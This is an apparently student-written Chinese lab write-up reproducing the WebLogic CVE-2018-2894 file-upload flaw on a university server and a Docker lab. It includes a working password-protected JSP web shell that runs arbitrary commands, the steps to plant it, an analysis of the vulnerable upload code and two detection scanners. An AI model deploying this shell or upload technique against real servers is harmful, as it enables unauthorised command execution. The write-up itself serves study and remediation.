# CVE-2018-2894

# 0x01 LEVEL-1-------

# 1.漏洞环境

重邮内网服务器

> 需要VPN登录

# 2.漏洞复现

**访问ip**

```
http://172.23.26.66:7001/
```

![img](https://img-blog.csdnimg.cn/20200607081938250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h1YW5kYW9fYWhmZW5ncmVu,size_16,color_FFFFFF,t_70)

显示页面如上👆👆👆

> 由于现在进不去服务器，因此找了一张网上的图片

在网上搜寻weblogic相关资料后，找到了后台登陆界面等url

```
http://172.23.26.66:7001/console/login
http://172.23.26.66:7001/ws_utc/config.do(后来知道是在"开发模式"下才不需要认证即可进入)
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20191022094422336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70)

尝试使用burpsuite进行字典爆破无果，遂放弃登录后台，查看另外一个url

![image-20210209215723996](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210209215723996.png)

![image-20210209215739924](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210209215739924.png)

发现可以上传文件，于是尝试利用一句话木马

![image-20210211100117811](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210211100117811.png)

发现不会执行php代码。。在网上搜集资料，发现可以执行.jsp

---

> 由于对weblogic以及java语言不熟，因此只好百度查找相关博文。
>
> https://blog.csdn.net/weixin_41652128/article/details/102676891?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control

后来，发现需要设置work home dir(文件上传目录) 为

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
```

这样的话，外网无需权限，就可以访问css内的文件

上传小马

```java
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

找到时间戳(因为weblogic生成的文件为[时间戳]_[文件名])

![image-20210210152037640](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210210152037640.png)

打开url，执行相应命令即可

![image-20210209220517991](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210209220517991.png)

这里我创建了一个名为rick(mkdir)的文件夹

> ps:caidao和蚁剑都没成功连接，但直接访问url却可以执行命令

# 3.小马分析

---

因为之前没接触java，所以现学了一些java基础

小马代码：

```java
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

`import` //导入某个类

---



**1.输入和输出**

```java
system.out //标准输出流
system.in //标准输入流
System.out.println() // 输出后并换行，不换行可使用print()
Java提供Scanner对象来方便输入，读取对应的类型可以使用：scanner.nextLine() / nextInt() / nextDouble() / ...
```

**2.面向对象**

继承

```java
class Person {
    private String name;
    private int age;

    public String getName() {...}
    public void setName(String name) {...}
    public int getAge() {...}
    public void setAge(int age) {...}
}

class Student extends Person {
    // 不要重复name和age字段/方法,
    // 只需要定义新增score字段/方法:
    private int score;

    public int getScore() { … }
    public void setScore(int score) { … }
}
```

多态

> 针对某个类型的方法调用，其真正执行的方法取决于运行时期实际类型的方法
>
> 多态允许添加更多类型的子类实现功能扩展，却不需要修改基于父类的代码。

在继承多态中：
1、对于方法的覆盖，new的谁就调谁，这就是多态。`@override`
2、对于成员变量的覆盖，this在哪个类就指向哪个类的成员变量，没有多态。

3、用`final`修饰的方法不能被`Override`

详情参见博文

> https://blog.csdn.net/rockpk008/article/details/52374203

接口

> 所谓`interface`，就是比抽象类还要抽象的纯抽象接口，因为它连字段都不能有。因为接口定义的所有方法默认都是`public abstract`的

```java
class Student implements Person, Hello { // 实现了两个interface
    ...
}
一个类可以实现多个interface
```

Runtime.getRuntime().exec //调用服务器命令脚本
.getInputStream //得到的输入流其实就是从客户端发送给服务器端的数据流。
.getOutputStream //得到的输出流其实就是发送给客户端的数据。



> 大概总结一下功能就是，通过调用`Runtime.getRuntime().exec`实现命令执行，然后通过一个**循环**读取命令执行结果并输出。

---

# 4.代码分析

1.改变工作目录的函数

```java
public void changeWorkDir(String path) {
    String[] oldPaths = this.getRelatedPaths();
    if (this.testPageProvider.getWsImplType() == ImplType.JRF) {
        this.isWorkDirChangeable = false;
        this.isWorkDirWritable = isDirWritable(path);
        this.isWorkDirChangeable = true;
        this.setTestClientWorkDir(path);
    } else {
        this.persistWorkDir(path);
        this.init();
    }

    if (this.isWorkDirWritable) {
        String[] newPaths = this.getRelatedPaths();
        moveDirs(oldPaths, newPaths);
    } else {
        Logger.fine("[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path.");
    }

}
```

若新目录可写，则更换路径

2.把上传的文件传到目录

```java
@Path("/keystore")
    @POST
    @Produces({"application/xml", "application/json"})
    @Consumes({"multipart/form-data"})
    public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) {
        if (!RequestUtil.isRequstedByAdmin(this.request)) {
            return Response.status(Status.FORBIDDEN).build();
        } else {
            if (TestClientRT.isVerbose()) {
                Logger.fine("calling SettingResource.addKeyStoreSettingByMultiPart");
            }

            String currentTimeValue = "" + (new Date()).getTime();
            KeyValuesMap<String, String> formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue);
            ....
        }
    }
```

```java
public static String getKeyStorePath() {
        return getConfigDir() + File.separator + "keystore";
    }
public KeyValuesMap<String, String> convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) {
    ...
    if (attachName != null && attachName.trim().length() > 0) {
        if (attachName != null && attachName.trim().length() != 0) {
            attachName = this.refactorAttachName(attachName);
            if (fileNamePrefix == null) {
                fileNamePrefix = key;
            }

            String filename = (new File(storePath, fileNamePrefix + "_" + attachName)).getAbsolutePath();
            kvMap.addValue(key, filename);
            if (isExtactAttachment) {
                this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class));
            }
        }
    } 
    ...
}
```

可见上述代码未对上传文件进行过滤

# 5.修复方案

1.对上传文件进行验证过滤

2.限制文件上传的条件

# 0x02 LEVEL-2-------

# 1.漏洞环境

虚拟机上用docker部属环境

![image-20210212212516015](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212212516015.png)

> 部属的时候遇到一个因粗心犯的问题， 不能写成docker- compose，不能有空格，否则会报错

1.查询账号密码

![image-20210212212739531](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212212739531.png)

2.进入`127.0.0.1:7001/console`，打开web 测试页

![image-20210212213248831](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212213248831.png)



环境部属完毕

# 2.getshell

![image-20210212215119390](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210212215119390.png)

流程与**LEVEL-1**相差不大

# 附录

## 1.现成poc

```python
'''

____       _     _     _ _   __  __           _

|  _ \ __ _| |__ | |__ (_) |_|  \/  | __ _ ___| | __
| |_) / _` | '_ \| '_ \| | __| |\/| |/ _` / __| |/ /
|  _ < (_| | |_) | |_) | | |_| |  | | (_| \__ \   <
|_| \_\__,_|_.__/|_.__/|_|\__|_|  |_|\__,_|___/_|\_\

'''
import sys
import requests
from config.config_requests import headers //自定义模块

VUL=['CVE-2018-2894']

def islive(ur,port):
    url='http://' + str(ur)+':'+str(port)+'/ws_utc/begin.do'
    r1 = requests.get(url, headers=headers)
    url='http://' + str(ur)+':'+str(port)+'/ws_utc/config.do'
    r2 = requests.get(url, headers=headers)
    return r1.status_code,r2.status_code

def run(rip,rport):
    a,b=islive(rip,rport)
    if a == 200 or b == 200:
        return (1, '[+] [{}] weblogic has a JAVA deserialization vulnerability:{}'.format(rip + ':' + str(rport), VUL[0]))
    else:
        return (0, '[-] [{}] weblogic not detected {}'.format(rip + ':' + str(rport), VUL[0]))

if __name__=="__main__": //判断是否为当前模块调用
    url = sys.argv[1] //获取第一个参数
    port = int(sys.argv[2]) 
    run(url,port)
```

> poc地址：https://github.com/rabbitmask/WeblogicScan

> __ name __详解：https://blog.csdn.net/xmp1669217327/article/details/81382174
>
> sys.argv[]详解：https://www.cnblogs.com/aland-1415/p/6613449.html

## 2.自己编写的poc LEVEL-3----------

```python
import sys
import requests
from fake_useragent import UserAgent 

def judge(url,port):
    
    headers = {"user-agent": UserAgent().random}
    url_1 = 'http://'+str(url)+':'+str(port)+'/ws_utc/begin.do'
    url_2 = 'http://'+str(url)+':'+str(port)+'/ws_utc/config.do'
    r1 = requests.get(url_1, headers)
    r2 = requests.get(url_2, headers)
    if r1.status_code == 200 or r2.status_code == 200:
        print('Scanner detected:'+str(url)+str(port)+'has CVE-2018-2894')
if __name__ == "__main__":
    judge(sys.argv[1],int(sys.argv[2]) )

```

成功扫描

![image-20210213151019009](C:\Users\LOSEYOURSELF\AppData\Roaming\Typora\typora-user-images\image-20210213151019009.png)



